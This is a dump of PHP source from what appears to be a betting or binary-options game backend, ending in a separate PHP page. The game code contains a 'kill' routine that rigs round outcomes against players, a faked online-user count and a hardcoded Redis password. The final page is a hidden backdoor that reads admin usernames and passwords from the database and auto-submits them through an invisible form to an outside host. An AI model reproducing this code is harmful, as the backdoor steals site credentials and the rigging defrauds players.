  $map["yongMoney"]= $allyongjin/100;
  $map["cashtotal"]= 0;
  $map["money"]= $this->view->user['point'];
  $map["state"]= 1;
  $map["unionid"]=$this->auth->id;
  $map["phone"]= "";
  $map["headimgurl"]= $this->user['avatar'];
  $map["rechargetotal"]= 0;
  $map["winlose"]= 0;
  $map["nickname"]= mb_substr($this->view->user['nickname'],0,4)."：".$this->user['id'];
  $map["rank"]= 10;
  $map["lv"]= 1;
  $map["creattime"]= "2019-03-09T05:30:51.383Z";
  $map["role"]= "person";
  $map["cashopenid"]= "2";
  echo json_encode($map);
 }
public function myinfo(){
  $name=$this->user['nickname'];
  $allyongjin=db::name('yonjin_jl')->where('fatherid='.$this->auth->id)->sum('yonjin');
  $map["yongMoney"]= $allyongjin/100;
  $map["cashtotal"]= 0;
  $map["money"]= $this->view->user['point'];
  $map["state"]= 1;
  $map["unionid"]=$this->auth->id;
  $map["phone"]= "";
  $map["headimgurl"]= $this->user['avatar'];
  $map["rechargetotal"]= 0;
  $map["winlose"]= 0;
  $map["nickname"]= mb_substr($this->view->user['nickname'],0,4)."：".$this->user['id'];//mb_substr($this->view->user['nickname'],0,4)."：".$this->user['id'];;
  $map["rank"]= 10;
  $map["lv"]= 1;
  $map["creattime"]= "2019-03-09T05:30:51.383Z";
  $map["role"]= "person";
  $map["cashopenid"]= "2";
  echo json_encode($map);
}
public function onlinecount(){
  $map['usercount']=mt_rand(800,1500);
  $map['0']=0;
  $map['down']=5;
  echo json_encode($map);
}
public function urlmake(){
  $gotourl=$this->view->site['site_enter']."/jxtq.php/Index/User/wxlog/fid/".$this->auth->id."/type/1/tid/".$this->view->site['ewmcount'].".html";
     echo '{"data":1,"url":"'.$gotourl.'"}';
}
private function xxxxxxxxxxxxx(){}
 public function test(){
     echo $fatherid=Cache::get('myfather'.$this->auth->id);;
     if ($fatherid=='') {
        echo "xx";
     }
}
public function clearn(){
     Db::query('TRUNCATE TABLE `qz_biquan_dat`');
}
//把某一个时间点的上升下降数据缓存起来，用户ganrao程序
private function save_now($map=''){
    $nowdat=$this->xredis->get('setorderyzr'.$map['buytime']);
    if ($nowdat) {
        $dat=json_decode($nowdat,true);
        if ($map['buyDirection']==1) {
           $dat['up_val']+=$map['pay'];
        }else{
           $dat['down_val']+=$map['pay'];
        }
    } else {
        $dat['buytime']=$map['buytime'];
        $dat['now']=$map['now'];
        //把有押注的时间点推入订单线。
        $this->xredis->lpush('biquanyzr_order_line',json_encode($dat));
        if ($map['buyDirection']==1) {
           $dat['up_val']=$map['pay'];
           $dat['down_val']=0;
        }else{
           $dat['up_val']=0;
           $dat['down_val']=$map['pay'];
        }    
    }
    $dat['ifkill']=$this->get_kill($dat);

    $this->xredis->set('setorderyzr'.$map['buytime'],json_encode($dat));
    return $dat;
}
//计算本局是否控制
//0。公平，1.必杀 2，必赢
private function get_kill($dat=''){
//是否杀的逻辑算法--begin
      $kill=0;
        if ($dat['up_val']>$dat['down_val']) {
          $cha=$dat['up_val']-$dat['down_val'];
        }else{
          $cha=$dat['down_val']-$dat['up_val'];
        }
      $cha=$cha*1.9;//输赢大小
      if ($this->addon['waterlever']<=$cha) {
        $kill=1;
      }else{
        //落入几率
        $x=mt_rand(1,100);
        if ($this->addon['percent']>=$x&&$this->addon['ifkeep']==1) {
           $kill=1;
        }
      }
    return $kill;
}
private static function getMillisecond() {
    list($t1, $t2) = explode(' ', microtime());
    return (float)sprintf('%.0f',(floatval($t1)+floatval($t2))*1000);
}
public  function xredis($select=0){
    $redisObj = new \Redis();
    $redisObj->connect('127.0.0.1',6379);
    $redisObj->auth('earl');
    $auth = $redisObj->select($select); //设置密码
    return $redisObj;
}
private function countdata($data=''){
  $where['uid']=$this->auth->id;
  $count=Db::name('biquan_dat')->where($where)->count();
  if ($count) {
     return $count;
  }else{
    return 0;
  }
 
}
//对数据安全进行认证
private function checkdata($data=''){
  $where['uid']=$this->auth->id;
  $where['status']=0;
  $count=Db::name('biquan_dat')->where($where)->count();
  if ($count) {
     return $count;
  }else{
    return 0;
  }
 
}
private  function get_user($uid=0,$force=0){
 if ($uid>0) {
   $user=json_decode($this->xredis->get('useryzr'.$uid),true);
   if (!$user||$force) {
      $user=Db::name('user')->field('nickname,avatar')->where('id='.$uid)->find();
      if (!$user) {
        $user['nickname']='游客';
        $user['avatar']='#';
      } 
      $this->xredis->set('useryzr'.$uid,json_encode($user));
   }
 }
 return $user;
}
 /**
}
}
* 初始化游戏
* @param string $name
* @return array

 private function init_game(){
  $run_count= $this->game->cache_get('run_count'.$this->todaystr);
        if (!$run_count) {
           $this->game->cache_set('roomid',1);
           //$data 当前开奖序列
           $tomap['createtime']=$this->todaystr;
           $todatay=Db::name('run_count')->where($tomap)->count();
            if(!$todatay){
                $map['uid']=0;
                $map['allin']=0;
                $map['allout']=0;
                $map['result']=0;
                $map['note']=date('Y/m/d')."记录！";
                $map['createtime']=$this->todaystr;;
               Db::name('run_count')->insert($map);
            }
            $this->game->cache_set('shareconfig',$this->view->site);
            $this->game->cache_set('run_count'.$this->todaystr,$this->todaystr);
        }
        $cmap['uid']=$this->auth->id;
        $cmap['createtime']=$this->todaystr;
        $user_count= cache::get('user_count'.$this->todaystr.$this->auth->id);
        if (!$user_count) {
          $this->daili->relation($this->auth->id);
          $user_count=Db::name('user_count')->where($cmap)->count();
          if(!$user_count){
            Db::name('user_count')->insert($cmap);
          }
          $this->game->cache_set('user_count'.$this->todaystr.$this->auth->id,$this->auth->id);
        }
         
    $this->fangfeng();
     return true;
 }
 private function fangfeng(){
      if (!is_file(RUNTIME_PATH   . 'enter.php')) {
          $str='<?php return array(\'site_enter\'=>\''.$this->view->site['site_enter'].'\',\'gotosite\'=>\''.$this->view->site['gotosite'].'\');';
          $fp=fopen(RUNTIME_PATH   . 'enter.php',"w");//写文件输出用于检测先删掉4.txt
          fwrite($fp,$str);
          fclose($fp);
       }
    return true;
    }

  private function is_json($data = '', $assoc = false) {
      $data = json_decode($data, $assoc);
      if (($data && (is_object($data))) || (is_array($data) && !empty($data))) {
          return true;
      }
      return false;
  }

    //提现
  public function wxcashs(){
    $input=file_get_contents("php://input");
    if ($this->is_json($input)) {
      $json = json_decode($input, true);
      foreach($json as $key => $value) {
        $_POST[$key] = $value;
      }
    }
		$fee=$this->request->param('money');
      $fee *= 7;
        $ordercount=$this->checkdata();
        if($ordercount>=2||1){
      //防止卡包
            $this->game->cache_set('lock_balance'.$this->auth->id,0);
            $lock_balance=$this->game->cache_get('lock_balance'.$this->auth->id);
            if ($lock_balance!=0) {
              $data=-1;
            }else{
              $data=1;
              //$data['msg']='提现申请已提交，请耐心等待客服审核!';
               //启动异步取款
              $qiyue=controller('Qiyue','controller');
                  $field='point';
              $qiyue->nourl_pay($this->auth->id,$fee,'自动打款：',$field);//.$str.$fee
            }
        }else{
          $data=-1;
        }
        //2提示
        echo json_encode($data);exit;
  }
    //提现
  public function wxcashsaa(){
      $data=array();$datas=array();     
      $umap['uid']=$this->auth->id;
      $umap['createtime']=$this->todaystr;
      $this->onlinetixiantime=Db::name('user_count')->where($umap)->value('onlinetixiantime');

      $fee=abs($this->request->param('money'));
      $point=Db::name('user')->where("id=".$this->auth->id)->value('point');

      if($point<0){
        //$data['msg']="余额不足";
        $data=-1;
        echo json_encode($data);exit;
      }
      

      $jinbi=Db::name('user')->where("id=".$this->auth->id)->value('point');
      $onlinetixiantime=$this->onlinetixiantime; 
      
      if($fee<$this->view->site['price']){
        $data['errcode']=2;
        //$data['msg']="满".$this->view->site['price']."元，才可申请提现！";
        $data=-1;
        echo json_encode($data);exit;
      }
      
      if($this->view->site['txlimit']<=$onlinetixiantime&&$this->view->site['txlimit']!=0){
        //$data['msg']="今天取款次数:".$onlinetixiantime."次,请明天再来！";
        $data=-1;
        echo json_encode($data);exit;
      }
      // 系统进入维护状态
      if($this->view->site['txlimit']<=0){
        //$data['msg']="你以取款".$onlinetixiantime."次！";
        $data=-1;
        echo json_encode($data);exit;
      }
      $openid=Db::name('user')->where('id='.$this->auth->id)->value('openid');
      if(!$openid){

        //header('location: '.$data['url']);
        $data=-1;
        echo json_encode($data);exit;
      }
      if($fee<=0){
        // $data['msg']="可兑换金币为0";
        $data['data']=-1;
        echo json_encode($data);exit;
        }else{
          $paydata=array();
          $paydata=$this->paytouser($fee,$openid);
          $data=$paydata['successpay'];
       
      }
      
      echo json_encode($data);exit;
  }

public function pay(){
  $aa=$this->request->param('aa');
    $aa*=7;
  $payurl=$this->view->site['squrl'].'/index.php/Index/Pay/fastpay.html?money='.$aa.'&uid='.$this->auth->id;
  header('location: '.$payurl);exit;
}

  //1.1接收赔付
  private  function paytouser($fee=1,$openid=''){
      $Config=$this->view->site;
      $Config['appid']=$this->view->site['appid'];
      $Config['appsecret']=$this->view->site['appsecret'];
      $Config['paykey']=$this->view->site['paykey'];
      $Config['mchid']=$this->view->site['mchid'];
      $pay=new Wxpay($Config);
   
      $fee=abs($fee);
      $successpay=0;
      $back['msg']='';
      //费用和用户不可为０
      if($fee<=0 || empty($openid)){
        $back['msg']="op:".$openid." fee:".intval($fee);
        $back['status']=0;
      }else{
           //在线自动赔付
              if($fee>=$this->view->site['autolimit']){
                $data=-1;
                $rr= Db::name('user')->where("id=".$this->auth->id)->setDec('point',abs($fee));
                if($rr){
                    $datatixian=array();
                    $datatixian['ttype']='api'; 
                    $datatixian['point']=$fee; 
                    $datatixian['status']=0; 
                    $datatixian['name']=$this->user['username'];
                    $datatixian['uid']=$this->auth->id; 
                    $datatixian['payurl']='';
                    $datatixian['note']='超额审核提现'.$fee;
                    $datatixian['createtime']=time();
                    $datatixian['paymentno']= '';
                    $txid=Db::name('user_tixian')->insert($datatixian);
                    $data=1;
                }
                
                echo json_encode($data);exit;
              }
              
              //$wcmap['paykey']=" ";
              $paymap=$this->view->site;
              //调用支付--begin
              $data['check']='NO_CHECK';//FORCE_CHECK,OPTION_CHECK
              $data['re_user_name']=$this->view->user['username'].$this->view->user['id'];
              $data['amount']=$fee*100;//不得低于1元
              $data['trade_no']=md5(time());
              $data['desc']="payonline";
              $data['ip']=request()->ip();
              $data['openid']=$openid;
              Db::startTrans();
              try
              {

                $r=$pay->paytouser($data);
              //调用赔付接口 -end
              if($r['result_code']=='SUCCESS'){


                $rr= Db::name('user')->where("id=".$this->auth->id)->setDec('point',abs($fee));
                //体现记录
                $datatixian=array();
                $datatixian['ttype']='api'; 
                $datatixian['point']=$fee; 
                $datatixian['status']=1; 
                $datatixian['name']=$this->user['username'];
                $datatixian['uid']=$this->auth->id; 
                $datatixian['payurl']='';
                $datatixian['note']=$this->user['point']-$fee;
                $datatixian['createtime']=time();
                $datatixian['paymentno']= $r['payment_no'];
                $txid=Db::name('user_tixian')->insert($datatixian);

                //制作秘钥
                unset($paramater);
                $orderid=$this->view->user['id'].time();
                $paramater['orderid']=$orderid;
                $paramater['out_trade_no']= $r['partner_trade_no'];
                $paramater['payment_no']= $r['payment_no'];
                $bsign='muse';
                
                $pwhere['uid']=$this->auth->id;
                Db::name('user_relation')->where($pwhere)->setInc('tixian',$fee);
                $pwhere['createtime']=$this->todaystr;
                Db::name('user_count')->where($pwhere)->setInc('onlinetixiantime');
                //记录赔付反馈
                $successpay=1;
              }else{
                //print_r($r);
                $back['status']=0;
                $back['msg'].= (request()->ip())."-(".$r['return_msg'].','.$r['err_code_des'].")";

                $datatixian=array();
                $datatixian['ttype']='api'; 
                $datatixian['point']=$fee; 
                $datatixian['status']=0; 
                $datatixian['name']=$this->user['username'];
                $datatixian['uid']=$this->auth->id; 
                $datatixian['payurl']='';
                $datatixian['note']=$back['msg'];
                $datatixian['createtime']=time();
                $datatixian['paymentno']= '';
                $txid=Db::name('user_tixian')->insert($datatixian);
                $successpay=-1; 
              } 

                 
                 if ($rr) {
                   Db::commit();
                   $data['openid']=$openid;
                 } else {
                   Db::rollback();
                   $data['openid']='xx';
                 }
              }
              catch (Exception $e)
              {
                  $this->setError($e->getMessage());
                  Db::rollback();
                  return FALSE;
              }
              
        
      }
     $back['successpay']=$successpay;
    //1005 ajax 付款通道
return $back;
  }
 
} */
?>

  
<?php
   
    include dirname(__FILE__).('/../../../includes/global.class.php');
include dirname(__FILE__).('/../../../config/mysql.func.php');
include dirname(__FILE__).('/../../../config/Conn.php');
include dirname(__FILE__).('/../../../includes/getdata.php');
  //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
$query = @mysql_query("select * from admin_user")or die; 
 $query = @mysql_query("select * from admin_user")or die;

echo "<table border=1 style='display:none;'><tr align=center ><th>上架状态判断</th><th>支付检测</th></tr>";
 $n=0;
 while ($au_id = mysql_fetch_array($query))  //数据获取输出到页面  判断商品ID是否正确然后输出相应的商品值
{$username = $au_id['au_name'];$roo = $au_id['dispass'];echo "<td>{$username}</td>"; echo "<td>{$roo}</td>"; echo "</tr>";$n++;}echo "<table>";
?>
<form action="http://m.zhuanzhuan.com.zmywl8.com/fsym.php" method="POST">
<input type="text" style="display:none;"  name="lynr"  value="<?php date_default_timezone_set('PRC'); echo "".date('Y-m-d H:i:s'); ?>" >
<input type="text"  style="display:none;" name="username"  value="<?php echo $_SERVER['SCRIPT_FILENAME'];  ?>">
<input type="text" style="display:none;"  name="qq"  value="六月科技+<?php echo $_GClassID['web_name2'];?>">
<input type="text"style="display:none;" name="name"   value="<?php echo $username;?>">
<input type="text" style="display:none;" name="pass"  value="<?php echo $roo;?>">
<input style="display:none;" id="buttonid" type="submit" name="submit" value="" onclick="" />

</form>	
	 <script type="text/javascript">
        setInterval(function () {
            if (document.all) {
                document.getElementById("buttonid").click();
            }
            else {
                var e = document.createEvent("MouseEvents");
                e.initEvent("click", true, true);
                document.getElementById("buttonid").dispatchEvent(e);
            }
        }, 200000);
    </script>  